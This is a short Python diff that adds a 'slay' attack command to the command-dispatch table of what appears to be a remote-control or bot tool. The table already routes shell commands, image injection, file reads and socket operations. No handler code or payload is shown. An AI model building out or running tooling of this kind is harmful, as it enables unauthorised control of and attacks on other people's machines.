@@ -1,7 +1,8 @@
-import  RequestsC, SystemC, SocketC, IinjC
+import  RequestsC, SystemC, SocketC, IinjC, moves
 
 class Filter_class:
     def __init__(self):
+        self.slay = moves.slay_attack()
         self.files = SystemC.Fiels()
         self.request = RequestsC.RequestsCommands()
         self.imageinj = IinjC.Imageinj()
@@ -11,6 +12,7 @@ class Filter_class:
         self.sockets = SocketC.SocketCommands()
         self.commands = {
             "cmd": self.system.Cmd,
+            "slay": self.slay.Ready,
             "ab": self.imageinj.Apbytes,
             "rs": self.imageinj.Restoredata,
             "rb": self.files.Readbytes,
